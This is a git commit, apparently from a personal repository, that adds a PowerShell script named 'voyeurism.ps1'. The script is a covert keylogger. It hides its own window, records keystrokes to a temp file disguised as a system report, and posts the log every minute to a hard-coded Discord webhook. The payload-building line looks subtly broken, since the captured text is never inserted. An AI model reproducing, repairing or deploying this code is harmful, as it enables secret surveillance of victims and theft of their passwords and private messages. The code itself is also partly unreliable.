e3ad748a21f4575eee10884dac251a449af0802f
eternalhoodie <juliabartelli3@gmail.com>
2025-04-30 10:36:07 -0400

    Create voyeurism.ps1

---
+++ voyeurism.ps1
@@ -0,0 +1,44 @@
+$hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
+$logFile = "$env:Temp\systemreport.log"
+
+# Keylogger function using .NET
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -Name KeyLogger -Namespace Win32 -MemberDefinition @"
+[DllImport("user32.dll")] 
+public static extern short GetAsyncKeyState(int vKey);
+"@
+
+# Stealth mechanism to hide window
+$stealthCode = @'
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'@
+Add-Type -Name Window -Namespace Win32 -MemberDefinition $stealthCode
+[Win32.Window]::ShowWindow((Get-Process -PID $PID).MainWindowHandle, 0)
+
+try {
+    while($true) {
+        Start-Sleep -Milliseconds 40
+        
+        # Capture all ASCII characters
+        1..254 | ForEach-Object {
+            $state = [Win32.KeyLogger]::GetAsyncKeyState($_)
+            if ($state -eq -32767) {
+                $key = [System.Windows.Forms.Keys]$_ | % {[char]$_}
+                if($key -match '[a-zA-Z0-9!@#$%^&*()_+{}\[\]:;",.<>?/\\|`~\-=]') {
+                    $key | Out-File $logFile -Append
+                }
+            }
+        }
+        
+        # Exfiltrate every 60 seconds
+        if((Get-Date).Second % 60 -eq 0) {
+            $content = [System.IO.File]::ReadAllText($logFile)
+            $payload = @{ content = "``````" } | ConvertTo-Json
+            Invoke-RestMethod -Uri $hook -Method Post -Body $payload -ContentType "application/json"
+            Clear-Content $logFile
+        }
+    }
+}
+finally {
+    Remove-Item $logFile -ErrorAction SilentlyContinue
+}
